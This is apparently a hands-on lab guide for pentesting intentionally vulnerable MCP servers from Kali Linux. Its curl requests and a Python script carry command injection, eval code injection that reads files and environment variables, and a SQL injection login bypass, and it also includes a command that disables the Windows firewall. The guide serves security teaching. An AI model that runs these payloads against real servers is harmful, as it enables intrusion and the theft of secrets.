# Kali Linux Security Testing Guide for MCP Servers

## Setup Overview

**Windows Machine (Target)**: Running MCP servers on ports 8080 and 8081
**Kali Linux (Attacker)**: Performing security tests

## Part 1: Windows Setup (Your Current Machine)

### Step 1: Find Your Windows IP Address

```cmd
ipconfig
```

Look for "IPv4 Address" - example: `192.168.1.100`
**Write this down - you'll need it on Kali!**

### Step 2: Start the HTTP Servers

Open two separate Command Prompt windows:

**Terminal 1 - Weather Server:**
```cmd
cd D:\workspaces\vscode\aiml
python weather_server_http.py
```

**Terminal 2 - Notes Server:**
```cmd
cd D:\workspaces\vscode\aiml
python notes_server_http.py
```

You should see:
```
Starting HTTP server on 0.0.0.0:8080
Server is accessible from other devices on the network
```

### Step 3: Configure Windows Firewall

**Option A: Using Command Prompt (Run as Administrator):**
```cmd
netsh advfirewall firewall add rule name="MCP Weather" dir=in action=allow protocol=TCP localport=8080
netsh advfirewall firewall add rule name="MCP Notes" dir=in action=allow protocol=TCP localport=8081
```

**Option B: Using GUI:**
1. Open "Windows Defender Firewall with Advanced Security"
2. Click "Inbound Rules" → "New Rule"
3. Select "Port" → Next
4. Enter port 8080 → Next
5. Allow the connection → Next
6. Apply to all profiles → Next
7. Name it "MCP Weather" → Finish
8. Repeat for port 8081

### Step 4: Verify Servers are Running

On Windows, test locally:
```cmd
curl http://localhost:8080/health
curl http://localhost:8081/health
```

You should see JSON responses with server status.

## Part 2: Kali Linux Setup (Attacking Machine)

### Step 1: Verify Network Connectivity

Make sure both machines are on the same network, then test connectivity:

```bash
# Replace 192.168.1.100 with your Windows IP
ping 192.168.1.100
```

If ping fails, check:
- Both devices on same WiFi/network
- Windows firewall allows ICMP (ping)

### Step 2: Test Server Accessibility

```bash
# Set your Windows IP as a variable for easy use
export TARGET_IP="192.168.1.100"

# Test weather server
curl http://$TARGET_IP:8080/health

# Test notes server
curl http://$TARGET_IP:8081/health
```

Expected output:
```json
{
  "status": "healthy",
  "server": "vulnerable-notes-mcp",
  "timestamp": "2026-02-11T...",
  "vulnerabilities": [...]
}
```

### Step 3: Port Scanning

```bash
# Quick scan
nmap -p 8080,8081 $TARGET_IP

# Detailed scan
nmap -sV -p 8080,8081 $TARGET_IP

# Full service detection
nmap -sV -sC -p 8080,8081 $TARGET_IP
```

## Part 3: Security Testing from Kali

### Test 1: Reconnaissance

```bash
# Check what's running
curl -v http://$TARGET_IP:8080/health
curl -v http://$TARGET_IP:8081/health

# Try common endpoints
curl http://$TARGET_IP:8081/
curl http://$TARGET_IP:8081/sse
curl http://$TARGET_IP:8081/messages
```

### Test 2: MCP Protocol Testing

Create a test script `test_mcp.py`:

```python
#!/usr/bin/env python3
import requests
import json

TARGET_IP = "192.168.1.100"  # Change this!
NOTES_PORT = 8081

def test_tool(tool_name, arguments):
    """Test a tool"""
    url = f"http://{TARGET_IP}:{NOTES_PORT}/call"
    
    payload = {
        "tool": tool_name,
        "arguments": arguments
    }
    
    print(f"\n[*] Testing {tool_name}")
    print(f"[*] Payload: {json.dumps(arguments, indent=2)}")
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response: {response.text}")
        return response
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

# Test 1: Basic functionality
print("="*60)
print("TEST 1: Basic Note Creation")
print("="*60)
test_tool("create_note", {"text": "Test note from Kali"})

# Test 2: Code Injection
print("\n" + "="*60)
print("TEST 2: Code Injection via eval")
print("="*60)
test_tool("search", {"query": "eval:2+2"})
test_tool("search", {"query": "eval:__import__('os').getcwd()"})

# Test 3: Command Injection
print("\n" + "="*60)
print("TEST 3: Command Injection")
print("="*60)
test_tool("run_command", {"cmd": "whoami"})
test_tool("run_command", {"cmd": "dir"})

# Test 4: SQL Injection
print("\n" + "="*60)
print("TEST 4: SQL Injection")
print("="*60)
test_tool("login", {"user": "admin' OR '1'='1", "pass": "anything"})

# Test 5: Hardcoded Credentials
print("\n" + "="*60)
print("TEST 5: Hardcoded Credentials")
print("="*60)
test_tool("login", {"user": "admin", "pass": "admin123"})

print("\n[*] Testing complete!")
```

Run it:
```bash
chmod +x test_mcp.py
python3 test_mcp.py
```

### Test 3: Command Injection Exploitation

```bash
# Basic command execution
curl -X POST http://$TARGET_IP:8081/call \
  -H "Content-Type: application/json" \
  -d '{
    "tool": "run_command",
    "arguments": {"cmd": "whoami"}
  }'

# Directory listing
curl -X POST http://$TARGET_IP:8081/call \
  -H "Content-Type: application/json" \
  -d '{
    "tool": "run_command",
    "arguments": {"cmd": "dir C:\\"}
  }'

# System information
curl -X POST http://$TARGET_IP:8081/call \
  -H "Content-Type: application/json" \
  -d '{
    "tool": "run_command",
    "arguments": {"cmd": "systeminfo"}
  }'
```

### Test 4: Code Injection via eval

```bash
# Simple calculation
curl -X POST http://$TARGET_IP:8081/call \
  -H "Content-Type: application/json" \
  -d '{
    "tool": "search",
    "arguments": {"query": "eval:2+2"}
  }'

# File system access
curl -X POST http://$TARGET_IP:8081/call \
  -H "Content-Type: application/json" \
  -d '{
    "tool": "search",
    "arguments": {"query": "eval:__import__('\''os'\'').listdir('\''.'\'')"}
  }'

# Read environment variables
curl -X POST http://$TARGET_IP:8081/call \
  -H "Content-Type: application/json" \
  -d '{
    "tool": "search",
    "arguments": {"query": "eval:__import__('\''os'\'').environ"}
  }'
```

### Test 5: SQL Injection

```bash
# Authentication bypass
curl -X POST http://$TARGET_IP:8081/call \
  -H "Content-Type: application/json" \
  -d '{
    "tool": "login",
    "arguments": {
      "user": "admin'\'' OR '\''1'\''='\''1",
      "pass": "anything"
    }
  }'
```

### Test 6: Weather Server Testing

```bash
# Test weather API
curl -X POST http://$TARGET_IP:8080/weather \
  -H "Content-Type: application/json" \
  -d '{"city": "London"}'

# Or using GET
curl "http://$TARGET_IP:8080/weather?city=London"
```

### Test 6: Automated Scanning with Burp Suite

1. **Configure Burp Proxy on Kali:**
   - Open Burp Suite
   - Go to Proxy → Options
   - Ensure proxy is listening on 127.0.0.1:8080

2. **Route traffic through Burp:**
```bash
export http_proxy=http://127.0.0.1:8080
export https_proxy=http://127.0.0.1:8080

curl http://$TARGET_IP:8081/health
```

3. **Capture and modify requests in Burp**

### Test 7: Metasploit Integration (Advanced)

If you want to create a custom Metasploit module:

```bash
# Create auxiliary module
cd /usr/share/metasploit-framework/modules/auxiliary/scanner/http/
nano mcp_scanner.rb
```

## Part 4: Monitoring on Windows

While testing from Kali, monitor on Windows:

```cmd
# Watch logs in real-time
powershell Get-Content notes_server_http.log -Wait

# Or in separate window
powershell Get-Content weather_server_http.log -Wait
```

## Part 5: Advanced Testing Tools

### Using sqlmap (for SQL injection)

```bash
# Note: This requires adapting the MCP protocol
# Create a wrapper script first
```

### Using nikto

```bash
nikto -h http://$TARGET_IP:8081
```

### Using OWASP ZAP

```bash
# Start ZAP
zaproxy

# Configure target: http://$TARGET_IP:8081
# Run automated scan
```

## Troubleshooting

### Can't Connect from Kali

1. **Check Windows IP:**
   ```cmd
   ipconfig
   ```

2. **Test Windows firewall:**
   ```cmd
   netsh advfirewall show allprofiles
   ```

3. **Temporarily disable firewall (testing only!):**
   ```cmd
   netsh advfirewall set allprofiles state off
   ```
   
   **Remember to re-enable:**
   ```cmd
   netsh advfirewall set allprofiles state on
   ```

4. **Check if servers are listening:**
   ```cmd
   netstat -an | findstr "8080"
   netstat -an | findstr "8081"
   ```

### Connection Timeout

- Ensure both devices on same network
- Check router settings (AP isolation disabled)
- Try pinging Windows from Kali first

### "Connection Refused"

- Verify servers are running on Windows
- Check correct ports (8080, 8081)
- Confirm firewall rules are active

## Clean Up After Testing

### On Windows:

```cmd
# Stop servers (Ctrl+C in each terminal)

# Remove firewall rules
netsh advfirewall firewall delete rule name="MCP Weather"
netsh advfirewall firewall delete rule name="MCP Notes"
```

### On Kali:

```bash
# Clear environment variables
unset TARGET_IP
unset http_proxy
unset https_proxy
```

## Expected Vulnerabilities to Find

1. ✅ **Command Injection** - Full system command execution
2. ✅ **Code Injection** - Python eval() exploitation
3. ✅ **SQL Injection** - Authentication bypass
4. ✅ **Hardcoded Credentials** - admin/admin123
5. ✅ **No Input Validation** - All inputs accepted
6. ✅ **Information Disclosure** - Detailed error messages
7. ✅ **No Rate Limiting** - Unlimited requests
8. ✅ **No Authentication** - Open access to all tools

## Report Template

Document your findings:

```
VULNERABILITY REPORT
====================

Target: MCP Notes Server
IP: [Windows IP]
Port: 8081
Date: [Date]

FINDINGS:

1. Critical: Remote Code Execution via eval()
   - Tool: search
   - Payload: eval:__import__('os').system('whoami')
   - Impact: Full system compromise

2. Critical: Command Injection
   - Tool: run_command
   - Payload: whoami
   - Impact: Arbitrary command execution

3. High: SQL Injection
   - Tool: login
   - Payload: admin' OR '1'='1
   - Impact: Authentication bypass

4. Medium: Hardcoded Credentials
   - Credentials: admin/admin123
   - Impact: Unauthorized access

RECOMMENDATIONS:
- Input validation and sanitization
- Remove eval() usage
- Parameterized queries
- Remove hardcoded credentials
- Implement authentication
- Add rate limiting
```

## Safety Reminders

⚠️ **IMPORTANT:**
- Only test on your own systems
- Keep servers on isolated network
- Never expose to public internet
- Document all findings
- Clean up after testing
- This is for educational purposes only
